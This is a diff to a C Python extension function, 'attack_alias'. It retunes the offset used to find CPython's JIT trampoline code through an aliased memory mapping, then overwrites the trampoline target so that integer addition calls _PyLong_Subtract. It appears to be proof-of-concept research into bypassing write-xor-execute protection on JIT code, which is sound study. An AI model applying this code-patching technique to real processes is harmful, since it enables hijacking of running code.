@@ -180,18 +180,18 @@ static PyObject* attack_alias(PyObject *self, PyObject *args) {
     // target_addr = alias_addr + 0x1B70;
     // instr = *(int *)target_addr;
     // attack the alias of jit trampoline code region
-    target_addr = alias_addr + 0x7060;
-    // trampoline target: data + 0x98
+    target_addr = alias_addr + 0xada0;
+    // trampoline target: data + 0x98 (in the stencil)
     // data offset: from code[] to data[]
     // inst offset: from executor_base (executor->jit_code) to instr base BINARY_OP_ADD_INT's code
     // target_addr = alias_addr + instr offset + data offset + trampoline target
 
     printf("----------------------\n");
     //printf("input_addr  (orig) : %p \n", input_addr+0x1B70);
-    printf("input_addr  (orig) : %p \n", input_addr+0x7060);
+    printf("input_addr  (orig) : %p \n", input_addr+0xada0);
     printf("target_addr (alias): %p \n", target_addr);
     //printf("original value       : 0x%08x \n", *(int *)(input_addr+0x1B70));
-    printf("original value       : 0x%llx \n", *(long long *)(input_addr+0x7060));
+    printf("original value       : 0x%llx \n", *(long long *)(input_addr+0xada0));
     printf("target_original value: 0x%llx \n", *(long long *)target_addr);
 
     printf("----overwrite some bad code on alias------------------\n");
@@ -203,7 +203,7 @@ static PyObject* attack_alias(PyObject *self, PyObject *args) {
     patch_64(target_addr, (uintptr_t)&_PyLong_Subtract);
 
     //printf("modified value @ orig : 0x%08x \n", *(int *)(input_addr+0x1B70));
-    printf("modified value @ orig : 0x%llx \n", *(long long *)(input_addr+0x7060));
+    printf("modified value @ orig : 0x%llx \n", *(long long *)(input_addr+0xada0));
     printf("modified value @ alias: 0x%llx \n", *(long long *)target_addr);
     printf("----------------------\n");
 
